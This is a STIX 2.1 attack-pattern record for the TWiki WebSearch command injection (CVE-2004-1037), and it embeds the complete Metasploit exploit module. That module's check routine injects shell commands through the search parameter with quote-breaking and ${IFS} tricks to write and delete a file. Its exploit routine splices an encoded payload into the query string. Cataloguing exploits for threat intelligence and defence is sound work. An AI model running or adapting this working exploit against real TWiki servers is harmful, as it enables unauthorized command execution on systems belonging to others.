{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aae017c1-6371-48ad-95ba-24e8a483d00a",
    "created": "2024-08-14T17:14:02.943237Z",
    "modified": "2024-08-14T17:14:02.943241Z",
    "name": "TWiki Search Function Arbitrary Command Execution",
    "description": " This module exploits a vulnerability in the search component of TWiki. By passing a 'search' parameter containing shell metacharacters to the 'WebSearch' script, an attacker can execute arbitrary OS commands. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/twiki_search.rb",
            "external_id": "twiki_search.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1037"
        },
        {
            "source_name": "reference",
            "url": "http://twiki.org/cgi-bin/view/Codev/SecurityAlertExecuteCommandsWithSearch"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TWiki Search Function Arbitrary Command Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in the search component of TWiki.\n        By passing a 'search' parameter containing shell metacharacters to the\n        'WebSearch' script, an attacker can execute arbitrary OS commands.\n      },\n      'Author'         =>\n        [\n          # Unknown - original discovery\n          'jduck'       # metasploit version\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-1037' ],\n          [ 'OSVDB', '11714' ],\n          [ 'BID', '11674' ],\n          [ 'URL', 'http://twiki.org/cgi-bin/view/Codev/SecurityAlertExecuteCommandsWithSearch' ]\n        ],\n      'Privileged'     => true, # web server context\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'BadChars'    => ' ',\n          'Space'       => 1024,\n        },\n      'Platform'       => [ 'unix' ],\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2004-10-01',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [ true, \"TWiki bin directory path\", \"/twiki/bin\" ]),\n      ])\n  end\n\n\n  def check\n    content = rand_text_alphanumeric(16+rand(16))\n    test_file = rand_text_alphanumeric(8+rand(8))\n    cmd_base = normalize_uri(datastore['URI'], '/view/Main/WebSearch?search=')\n    test_url = normalize_uri(datastore['URI'], '/view/Main/', test_file)\n\n    # first see if it already exists (it really shouldn't)\n    res = send_request_raw({\n        'uri' => test_url\n      }, 25)\n    if (not res) or (res.body.match(content))\n      vprint_warning(\"The test file exists already!\")\n      return Exploit::CheckCode::Unknown # Need to try again with a different file\n    end\n\n    # try to create it\n    vprint_status(\"Attempting to create #{test_url} ...\")\n    search = rand_text_numeric(1+rand(5)) + \"\\';echo${IFS}\" + content + \"${IFS}>\" + test_file + \".txt;#\\'\"\n    res = send_request_raw({\n        'uri' => cmd_base + Rex::Text.uri_encode(search)\n      }, 25)\n    if (not res) or (res.code != 200)\n      return Exploit::CheckCode::Safe\n    end\n\n    # try to run it, 500 code == successfully made it\n    res = send_request_raw({\n        'uri' => test_url\n      }, 25)\n    if (not res) or (not res.body.match(content))\n      return Exploit::CheckCode::Safe\n    end\n\n    # delete the tmp file\n    print_status(\"Attempting to delete #{test_url} ...\")\n    search = rand_text_numeric(1+rand(5)) + \"\\';rm${IFS}-f${IFS}\" + test_file + \".txt;#\\'\"\n    res = send_request_raw({\n        'uri' => cmd_base + Rex::Text.uri_encode(search)\n      }, 25)\n    if (not res) or (res.code != 200)\n      vprint_warning(\"WARNING: unable to remove test file (#{test_file})\")\n    end\n\n    return Exploit::CheckCode::Vulnerable\n  end\n\n\n  def exploit\n\n    search = rand_text_alphanumeric(1+rand(8))\n    search << \"';\" + payload.encoded + \";#\\'\"\n\n    query_str = normalize_uri(datastore['URI'], '/view/Main/WebSearch')\n    query_str << '?search='\n    query_str << Rex::Text.uri_encode(search)\n\n    res = send_request_cgi({\n        'method'    => 'GET',\n        'uri'       => query_str,\n      }, 25)\n\n    if (res and res.code == 200)\n      print_good(\"Successfully sent exploit request\")\n    else\n      fail_with(Failure::Unknown, \"Error sending exploit request\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-10-01",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}